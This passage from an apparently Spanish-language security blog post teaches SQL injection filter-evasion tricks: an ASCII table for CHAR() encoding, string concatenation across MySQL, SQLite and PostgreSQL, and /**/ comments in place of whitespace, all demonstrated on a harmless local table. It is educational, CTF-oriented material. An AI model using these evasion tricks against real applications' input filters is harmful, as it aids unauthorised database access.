+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tables
+       For convenience, below is a more compact table in decimal.
+
+          30 40 50 60 70 80 90 100 110 120
+         ---------------------------------
+        0:    (  2  &lt;  F  P  Z  d   n   x
+        1:    )  3  =  G  Q  [  e   o   y
+        2:    *  4  &gt;  H  R  \  f   p   z
+        3: !  +  5  ?  I  S  ]  g   q   {
+        4: "  ,  6  @  J  T  ^  h   r   |
+        5: #  -  7  A  K  U  _  i   s   }
+        6: $  .  8  B  L  V  `  j   t   ~
+        7: %  /  9  C  M  W  a  k   u  DEL
+        8: &amp;  0  :  D  N  X  b  l   v
+        9: '  1  ;  E  O  Y  c  m   w
+</code></pre></div></div>
+
+<p>Y el ejemplo seria:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">anime</span> <span class="k">FROM</span> <span class="n">waifus</span> <span class="k">WHERE</span> <span class="n">nombre</span> <span class="o">=</span> <span class="nb">CHAR</span><span class="p">(</span><span class="mi">77</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">);</span> <span class="c1">--&gt; Ahi dice "Miwa"</span>
+</code></pre></div></div>
+
+<h3 id="concatenacion-de-strings">Concatenacion de strings</h3>
+<p>Basicamente dividir la palabra y luego unirla</p>
+
+<p>MySQL: <code class="language-plaintext highlighter-rouge">SELECT anime FROM waifus WHERE nombre=CONCAT('Miwa Yama','mura');</code></p>
+
+<p>sqlite y PostgresSQL: <code class="language-plaintext highlighter-rouge">SELECT anime FROM waifus WHERE nombre='Miwa Yama'||'mura';</code></p>
+
+<h3 id="comentarios">Comentarios</h3>
+<p>Basicamente es divir una consulta entre comentarios, tambien sirve para evadir la restriccion cuando no se admiten espacios en blanco</p>
+
+<p>Ejemplo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span><span class="cm">/**/</span><span class="o">*</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="n">waifus</span><span class="cm">/**/</span><span class="k">WHERE</span><span class="cm">/**/</span><span class="n">nombre</span><span class="cm">/**/</span><span class="o">=</span><span class="cm">/**/</span><span class="s1">'Miwa Yamamura'</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------------+-----------+</span>
+<span class="o">|</span> <span class="n">nombre</span>        <span class="o">|</span> <span class="n">anime</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+-----------+</span>
+<span class="o">|</span> <span class="n">Miwa</span> <span class="n">Yamamura</span> <span class="o">|</span> <span class="n">Barakamon</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------+-----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Si quieres ver algunas de estas tecnicas para evadir filtros pero aplicados a una CTF, puedes leer este otro post mio: <a href="https://ic4rta.github.io/posts/picoCTF-web-gauntlet/">picale aqui</a></p>
+
+<p>Y como extra, si quieres la explicacion de los labs de PortSwigger puedes ver el writeup de mi compa <a href="https://dantedansh.github.io/SQL-Injection-SQLi-PortSwigger/#">dansh</a></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
